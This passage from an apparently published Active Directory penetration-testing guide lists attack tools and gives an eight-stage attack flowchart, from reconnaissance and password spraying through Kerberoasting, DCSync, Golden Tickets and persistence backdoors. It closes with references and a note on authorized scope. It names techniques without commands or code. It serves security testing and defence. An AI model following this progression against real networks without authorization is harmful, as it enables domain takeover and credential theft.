| **Certify**             | ADCS               | ADCS enumeration and abuse (C#)                  |
| **Whisker**             | Shadow Credentials | Shadow Credentials attack tool                   |
| **ldapdomaindump**      | Enumeration        | LDAP-based domain information dump               |
| **PetitPotam**          | Coercion           | NTLM authentication coercion                     |
| **Coercer**             | Coercion           | Multiple coercion techniques                     |
| **ADRecon**             | Enumeration        | Comprehensive AD enumeration and reporting       |
| **PingCastle**          | Assessment         | AD security assessment tool                      |
| **Purple Knight**       | Assessment         | Community AD security assessment                 |
| **LaZagne**             | Credential         | Credential recovery from various sources         |
| **Responder**           | MITM               | LLMNR/NBT-NS/mDNS poisoning                     |

---

## Quick Reference Attack Flowchart

::code-preview
---
class: "[&>div]:*:my-0"
---
Typical AD attack progression.

#code
```
AD Penetration Testing Flow:

1. RECONNAISSANCE
   ├── Network scanning (Nmap, CrackMapExec)
   ├── DNS enumeration
   ├── LDAP anonymous queries
   └── SMB null sessions

2. INITIAL ACCESS
   ├── Password spraying (Kerbrute, CrackMapExec)
   ├── LLMNR/NBT-NS poisoning (Responder)
   ├── NTLM relay (ntlmrelayx)
   ├── Phishing → credential capture
   └── Exploit vulnerable services

3. ENUMERATION (post-auth)
   ├── BloodHound collection (SharpHound)
   ├── PowerView enumeration
   ├── LDAP queries
   ├── Share enumeration (CrackMapExec)
   ├── ACL analysis
   └── ADCS template enumeration (Certipy)

4. PRIVILEGE ESCALATION
   ├── Kerberoasting → crack service account
   ├── AS-REP Roasting → crack no-preauth accounts
   ├── ACL abuse (WriteDACL, GenericAll, etc.)
   ├── ADCS abuse (ESC1-ESC8)
   ├── GPO abuse
   ├── LAPS password reading
   ├── Delegation abuse (constrained/unconstrained)
   └── DNS Admin abuse

5. LATERAL MOVEMENT
   ├── Pass-the-Hash (PtH)
   ├── Pass-the-Ticket (PtT)
   ├── Over-Pass-the-Hash
   ├── PSExec / WMIExec / SMBExec
   ├── Evil-WinRM
   ├── RDP
   └── DCOM execution

6. DOMAIN DOMINANCE
   ├── DCSync → dump all hashes
   ├── NTDS.dit extraction
   ├── Golden Ticket
   ├── Silver Ticket
   └── Certificate forgery

7. PERSISTENCE
   ├── Golden/Silver Tickets
   ├── Skeleton Key
   ├── AdminSDHolder abuse
   ├── SID History injection
   ├── DCShadow
   ├── Custom SSP
   ├── GPO backdoors
   └── ADCS persistence (certificate enrollment)

8. REPORTING
   ├── Document all findings
   ├── Provide attack paths
   ├── Risk ratings per finding
   └── Remediation recommendations
```
::

---

## References

- [Microsoft Active Directory Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/)
- [HackTricks - Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [PayloadsAllTheThings - Active Directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [The Hacker Recipes - Active Directory](https://www.thehacker.recipes/ad/)
- [ired.team - Active Directory](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Impacket Documentation](https://github.com/fortra/impacket)
- [SpecterOps Blog](https://posts.specterops.io/)
- [Harmj0y Blog](https://blog.harmj0y.net/)
- [Sean Metcalf - ADSecurity.org](https://adsecurity.org/)
- [SANS Active Directory Security](https://www.sans.org/white-papers/)
- [MITRE ATT&CK - Enterprise](https://attack.mitre.org/matrices/enterprise/)
- [Microsoft Security Best Practices](https://learn.microsoft.com/en-us/security/)
- [PingCastle Documentation](https://www.pingcastle.com/)
- [CIS Benchmarks for Active Directory](https://www.cisecurity.org/)

::tip
Active Directory security is both an **offensive** and **defensive** discipline. Understanding attack techniques helps defenders build better detection and prevention controls, while understanding defenses helps pentesters identify gaps. Always operate within **authorized scope** and document all findings thoroughly.
::
